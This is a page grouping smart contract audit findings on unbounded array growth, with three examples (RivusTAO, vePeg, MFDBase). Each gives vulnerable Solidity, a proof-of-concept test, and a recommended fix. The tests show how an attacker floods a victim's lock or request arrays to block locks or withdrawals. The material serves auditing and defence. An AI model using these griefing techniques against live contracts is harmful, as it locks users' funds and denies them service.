# Cluster -1105

**Rank:** #332  
**Count:** 20  

## Label
Poor array management leading to unbounded growth and excessive gas consumption, causing denial-of-service through out-of-gas failures in participation or processing loops.

## Cluster Information
- **Total Findings:** 20

## Examples

### Example 1

**Auto Label:** Unbounded array growth leading to gas exhaustion and denial-of-service, enabling fund locking and unauthorized state manipulation.  

**Original Text Preview:**

The `maxUnstakeRequests` variable helps limit the number of `unstakeRequests` a user can have. This variable is validated in the `requestUnstake()` function in lines `RivusTAO#L607-609`:

```solidity
File: RivusTAO.sol
555:   function requestUnstake(uint256 rsTAOAmt) public payable nonReentrant checkPaused {
...
...
606:     if (!added) {
607:       require(
608:         unstakeRequests[msg.sender].length < maxUnstakeRequests,
609:         "Maximum unstake requests exceeded"
610:       );
611:       unstakeRequests[msg.sender].push(
612:         UnstakeRequest({
613:           amount: rsTAOAmt,
614:           taoAmt: outWTaoAmt,
615:           isReadyForUnstake: false,
616:           timestamp: block.timestamp,
617:           wrappedToken: wrappedToken
618:         })
619:       );
...
629:     }
...
...
638:   }
```

The problem is that `maxUnstakeRequests` can be modified via the `setMaxUnstakeRequest()` function, causing this variable validation to not work as expected. Consider the following scenario:

1. The owner calls `setMaxUnstakeRequest()` with a value of `2`.
2. `Account1` deposits `10e9 wTAO tokens`, obtaining `10e9 rsTAO tokens`.
3. For some reason, `Account1` performs an `unstaking` of `1e9 rsTAO` and another of `2e9 rsTAO`, obtaining `3e9 wTAO - fees`.
4. The owner modifies `setMaxUnstakeRequest()` and decreases it to a value of `1`.
5. `Account1` performs another `unstaking` of `3e9 rsTAO` and `4e9 rsTAO` in separate transactions, resulting in `Account1` having 2 `requestStaking`. **This is incorrect** as `Account1` should be limited to only 1 `requestUnstaking` since `maxUnstakeRequests` was decreased in `step 4`.

The following test demonstrates the previous scenario:

```js
it("maxUnstakeRequests is not used when user have already unstakeRequests", async function () {
  // setup
  const { owner, account1, account2, account3, wTAO, rsTAO, wrsTAO } =
    await loadFixture(deployContracts);
  await wTAO.setBridge(owner.address);
  const froms = ["from0", "from1", "from1", "from1"];
  const tos = [
    owner.address,
    account1.address,
    account2.address,
    account3.address,
  ];
  const amounts = [
    ethers.parseUnits("100", 9),
    ethers.parseUnits("10", 9),
    ethers.parseUnits("10", 9),
    ethers.parseUnits("10", 9),
  ];
  await wTAO.bridgedTo(froms, tos, amounts);
  console.log(
    "\nAccount1 wTAO balance: ",
    ethers.formatUnits(await wTAO.balanceOf(account1.address), 9)
  );
  console.log(
    "Account1 rsTAO balance: ",
    ethers.formatUnits(await rsTAO.balanceOf(account1.address), 9)
  );
  //
  // 1. Owner set max unstakeRequest to 2 just for the testing purposes
  await rsTAO.setMaxUnstakeRequest(2);
  //
  // 2. Account1 stakes wTAO
  let amountToStake = ethers.parseUnits("10", 9);
  console.log("\nStaking", ethers.formatUnits(amountToStake, 9), "wTAO...");
  await wTAO.connect(account1).approve(rsTAO.target, amountToStake);
  await rsTAO.connect(account1).wrap(amountToStake);
  console.log(
    "Account1 wTAO balance: ",
    ethers.formatUnits(await wTAO.balanceOf(account1.address), 9)
  );
  console.log(
    "Account1 rsTAO balance: ",
    ethers.formatUnits(await rsTAO.balanceOf(account1.address), 9)
  );
  //
  // 3. Account1 request unstake 1 wTAO
  console.log("\nRequest unstake 1 wTAO...");
  await rsTAO.connect(account1).requestUnstake(ethers.parseUnits("1", 9), {
    value: ethers.parseEther("0.003"),
  });
  //
  // 4. Account1 request unstake 2 wTAO
  console.log("\nRequest unstake 2 wTAO...");
  await rsTAO.connect(account1).requestUnstake(ethers.parseUnits("2", 9), {
    value: ethers.parseEther("0.003"),
  });
  //
  // 5. Account1 unstake both `requestUnstakes`
  console.log("\nOwner approves all the `Account1` requestUnstake");
  const userRequests = [
    { user: account1.address, requestIndex: 0 },
    { user: account1.address, requestIndex: 1 },
  ];
  await wTAO.approve(rsTAO.target, ethers.parseUnits("10", 9));
  await rsTAO.approveMultipleUnstakes(userRequests);
  console.log("\nAccount1 unstake both requests");
  await rsTAO.connect(account1).unstake(0);
  await rsTAO.connect(account1).unstake(1);
  console.log(
    "Account1 wTAO balance: ",
    ethers.formatUnits(await wTAO.balanceOf(account1.address), 9)
  );
  console.log(
    "Account1 rsTAO balance: ",
    ethers.formatUnits(await rsTAO.balanceOf(account1.address), 9)
  );
  //
  // 6. Owner set max unstakeRequest to 1 but the account1 can still use 2 request unstakes
  await rsTAO.setMaxUnstakeRequest(1);
  console.log("\nRequest unstake 3 wTAO...");
  await rsTAO.connect(account1).requestUnstake(ethers.parseUnits("1", 9), {
    value: ethers.parseEther("0.003"),
  });
  console.log("\nRequest unstake 4 wTAO...");
  await rsTAO.connect(account1).requestUnstake(ethers.parseUnits("2", 9), {
    value: ethers.parseEther("0.003"),
  });
  let getUserRequests = await rsTAO.getUnstakeRequestByUser(account1.address);
  console.log(getUserRequests.length);
});
```

It is recommended to ensure that `maxUnstakeRequests` is not exceeded within the section where empty `unstakeRequests` are reused in lines `RivusTAO#L577-L602`.

```solidity
File: RivusTAO.sol
555:   function requestUnstake(uint256 rsTAOAmt) public payable nonReentrant checkPaused {
...
...
576:     // Loop throught the list of existing unstake requests
577:     for (uint256 i = 0; i < length; i++) {
578:       uint256 currAmt = unstakeRequests[msg.sender][i].amount;
579:       if (currAmt > 0) {
580:         continue;
581:       } else {
582:         // If the curr amt is zero, it means
583:         // we can add the unstake request in this index
584:         unstakeRequests[msg.sender][i] = UnstakeRequest({
585:           amount: rsTAOAmt,
586:           taoAmt: outWTaoAmt,
587:           isReadyForUnstake: false,
588:           timestamp: block.timestamp,
589:           wrappedToken: wrappedToken
590:         });
591:         added = true;
592:         emit UserUnstakeRequested(
593:           msg.sender,
594:           i,
595:           block.timestamp,
596:           rsTAOAmt,
597:           outWTaoAmt,
598:           wrappedToken
599:         );
600:         break;
601:       }
602:     }
...
...
```

---
### Example 2

**Auto Label:** Unbounded array growth leading to gas exhaustion and denial-of-service, enabling fund locking and unauthorized state manipulation.  

**Original Text Preview:**

## Severity

**Impact:** Medium

**Likelihood:** Medium

## Description

An attacker can use `create_lock_for()` to create locks on behalf of other users using just 1 wei and `MAXTIME`, reaching `MAX_DELEGATES`. As a result, when the affected user attempts to create a lock, the transaction will revert with `"dstRep would have too many tokenIds"` preventing them from creating new locks.

```solidity
function create_lock_for(uint256 _value, uint256 _lock_duration, address _to)
        external
        nonreentrant
        returns (uint256)
    {
        return _create_lock(_value, _lock_duration, _to);
    }

```

This is a significant issue because the user cannot resolve it by calling `withdraw()` to eliminate the locks, as they must wait until the lock period expires. The attacker can set the lock to `MAXTIME`, forcing the user to wait a full year before being able to create a new lock.

```solidity
require(block.timestamp >= _locked.end, "The lock didn't expire");
```

To better understand the issue, copy the following POC into `vePeg.t.sol`.

```solidity
function test_DOS_createlockfor() external {

        uint256 aliceAmountToLock = 1;
        uint256 aliceLockDuration = 365 days;

        vm.startPrank(ALICE);

        peg.approve(address(ve), type(uint256).max);

        //Alice creates 128 locks, each with 1 wei and the maximum duration, to perform a DOS attack on Bob
        for(uint256 i = 0; i < 128; i++) {

            uint256 aliceLockId = ve.create_lock_for(aliceAmountToLock, aliceLockDuration, BOB);
        }

        vm.stopPrank();

        vm.startPrank(BOB);

        uint256 bobAmountToLock = 1e18;
        uint256 bobLockDuration = 365 days;

        peg.approve(address(ve), bobAmountToLock);

        //Bob attempts to create a lock, but the transaction reverts due to Alice's DoS attack.
        vm.expectRevert("dstRep would have too many tokenIds");
        ve.create_lock(bobAmountToLock, bobLockDuration);

        vm.stopPrank();
    }
```

## Recommendations

Two potential fixes:

1. Set a minimum value requirement for the amount necessary for creating a lock to make the attack less feasible.
2. Restrict `create_lock_for()` access to trusted entities only.

---
### Example 3

**Auto Label:** Unbounded array growth leading to gas exhaustion and denial-of-service, enabling fund locking and unauthorized state manipulation.  

**Original Text Preview:**

## Context
(No context files were provided by the reviewer)

## Description
The function `MFDBase.stake()` allows staking on behalf of someone else. During staking, a `StakedLock` is pushed into the user's `$.userLocks[user]` array. When a `StakedLock` expires, the user is eligible to withdraw their staked tokens. However, every exposed function in `MFDBase` that attempts to withdraw a user's expired locks calls `MFDLogic.handleWithdrawOrRelockLogic()` with `_limit` equal to the length of `$.userLocks[msg.sender]`. 

For example, `MFDBase.withdrawExpiredLocks()`:

```solidity
function withdrawExpiredLocks() external whenNotPaused returns (uint256) {
    uint256 unlocked = getUserBalances(msg.sender).unlocked;
    if (unlocked == 0) revert AmountZero();
    _beforeWithdrawExpiredLocks(unlocked);
    MultiFeeDistributionStorage storage $ = _getMFDBaseStorage();
    return MFDLogic.handleWithdrawOrRelockLogic($, msg.sender, false, $.userLocks[msg.sender].length);
}
```

Therefore, the entire array `$.userLocks[msg.sender]` will be traversed in an attempt to withdraw expired locks. If the array's length becomes excessive, an "Out Of Gas" revert can occur that will prevent a user from ever withdrawing their expired locks. Since `MFDBase.stake()` allows staking on behalf of someone else, a malicious user can flood other users' arrays with `StakedLocks` that contain small amounts of LP tokens, essentially increasing the array's size to a point where the user will not be able to withdraw due to the "Out Of Gas" revert.

## Proof of Concept
The following test displays how a user's `userLocks` can increase to a size of 501.

- Add the test displayed below to `POC_Test.t.sol`.
- Add the helper functions `_stake_user_with_index()` and `_stake_user_on_behalf()` to `POC_Test.t.sol`.
- Add the imports displayed below.
- Execute with `forge test --match-test test_poc_issue8 -vv`.
- Inspect the logs.

```solidity
function test_poc_issue8() public {
    address user = makeAddr("user");
    address maliciousUser = makeAddr("maliciousUser");
    vm.prank(user);
    staker.setDefaultLockIndex(2);
    
    // Create a new reward token
    MockToken newRewardToken = new MockToken("newreward", "newreward");
    
    // Remove the reward address(1024), the MockVe has this hardcoded and is added as reward during deployment
    // If not removed some functions revert since address(1024) is not a ERC20
    vm.prank(Admin.addr);
    staker.removeReward(address(1024));
    
    // Add the new reward
    vm.prank(Admin.addr);
    staker.addReward(address(newRewardToken));
    
    // User stakes for 3 months
    _stake_user_with_index(user, 1 ether, THREE_MONTH_TYPE_INDEX);
    
    // Malicious user stakes on behalf of the user with small amounts of LP tokens
    // thus flooding the user's locks array
    for(uint i=0; i < 500; i++) {
        _stake_user_on_behalf(maliciousUser, user, 1e10);
    }
    
    StakedLock[] memory locks = staker.getUserLocks(user);
    console.log("length of the locks array:", locks.length);
}
```

```solidity
function _stake_user_with_index(address user, uint256 amount, uint256 index) internal {
    uint256 amount = 1 ether;
    load_weth9(user, amount, weth9);
    uint256 lpAmount;
    vm.startPrank(user);
    {
        weth9.approve(address(lockzap), amount);
        (,, uint256 minLpTokens) = vAmmPoolHelper.quoteAddLiquidity(0, amount);
        console.log("minLpTokens", minLpTokens);
        lpAmount = lockzap.zap(
            amount, // weth9Amt
            0, // emissionTokenAmt
            index, // lockTypeIndex
            minLpTokens // slippage check
        );
    }
    vm.stopPrank();
}

function _stake_user_on_behalf(address user, address onBehalf, uint256 amount) internal {
    uint256 amount = 1 ether;
    load_weth9(user, amount, weth9);
    uint256 lpAmount;
    vm.startPrank(user);
    {
        weth9.approve(address(lockzap), amount);
        (,, uint256 minLpTokens) = vAmmPoolHelper.quoteAddLiquidity(0, amount);
        console.log("minLpTokens", minLpTokens);
        lpAmount = lockzap.zapOnBehalf(
            amount, // weth9Amt
            0, // emissionTokenAmt
            onBehalf,
            minLpTokens // slippage check
        );
    }
    vm.stopPrank();
}
```

```solidity
import {Reward, StakedLock} from "../src/dependencies/MultiFeeDistribution/MFDDataTypes.sol";
import {MockToken} from "./mocks/MockToken.t.sol";
```

## Recommendation
Add an upper bound to how many `StakedLock` elements there can be in a `userLocks` array.

## DeFi App
Fixed in commit `e040e481`.

---
